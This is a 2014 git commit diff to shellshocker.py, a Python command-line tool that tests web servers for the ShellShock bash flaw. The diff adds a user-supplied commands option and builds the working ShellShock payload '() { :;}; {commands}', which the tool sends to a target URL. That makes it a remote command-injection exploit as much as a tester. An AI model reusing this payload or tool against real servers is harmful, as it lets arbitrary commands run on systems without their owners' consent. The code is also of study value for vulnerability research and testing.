12d3e6cf05dfea98a95d040e4c75e90522bd2ebd
Liam M <archimedespi3141@gmail.com>
2014-09-26 10:56:10 -0500

    Better CLI, work on website

--- shellshocker.py
+++ shellshocker.py
@@ -14,9 +14,9 @@ import click # Click is Armin Ronacher's new CLI framework. It's awesomesauce.
 @click.command()
 @click.argument('url')
 @click.option('-v', '--verbose', is_flag=True, help='Make the tester more verbose for debugging')
-@click.option('-c', '--command', help='Command to inject into the payload')
+@click.option('-c', '--commands', help='Command to inject into the payload')
 @click.option('-p', '--payload', type=click.Choice(['traditional', 'new']), help='Choose between the original bug and the new one')
-def test_site(url, verbose):
+def test_site(url, verbose, commands, payload):
   """
   Test the URL `URL` for ShellShock vulnerability.
   """
@@ -24,8 +24,18 @@ def test_site(url, verbose):
 
   if verbose:
     click.echo("Creating instance of exploit on {url}".format(url=url))
+    click.echo("Using commands {commands}".format(commands=commands))
+    click.echo("Using the {payload} payload".format(payload=payload))
+
+  if payload == 'traditional':
+    payloadstring = '() {{ :;}}; {commands}'
+  elif payload == 'new':
+    raise NotImplementedError("Not supported yet")
+  else:
+    payloadstring = '() {{ :;}}; {commands}'
+
   # Create a instance of the exploiter
-  shocker = ShellShocker({'url': url})
+  shocker = ShellShocker({'url': url, 'commands': commands, 'payload': payloadstring, 'verbosity': verbose})
 
   if verbose:
     click.echo("Sending exploit to {url}".format(url=url))
